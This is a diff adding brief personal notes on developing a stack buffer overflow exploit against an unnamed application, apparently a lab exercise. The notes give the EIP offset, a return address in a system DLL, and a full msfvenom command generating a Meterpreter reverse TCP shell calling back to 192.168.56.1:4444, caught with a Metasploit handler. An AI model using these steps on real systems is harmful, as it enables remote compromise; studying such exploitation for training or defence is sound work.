@@ -1,0 +1,23 @@
+Steps 
+======================
+1) Verified that huge username crashes it
+	* crashes whole application, not just thread!
+2) Found offset at 2005
+	* Confirmed by sending "A"*2004 + "BBBB" + "C"*500 
+	* Current offset is at 2009....investigate : //TODO
+3) Have 480 bytes at [esp]
+	* Confirmed by examining the stack 
+4) Disallowed bytes 
+	* 
+5) Overwrite EIP with <ret = "\x68\x97\xe7\x7c">, system dll with no DEP/ASLR
+	* All application ones had \x00 in the address :( *
+	* Can just reliably to \xCC instructions after EIP 
+6) Got shell :)
+	* msfvenom -payload windows/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -f python -b "\x0d\x0a\x00\xf1"
+	* user exploit/multi/handler .....
+
+
+
+Other exploits
+======================
+http://www.exploit-db.com/exploits/26471/
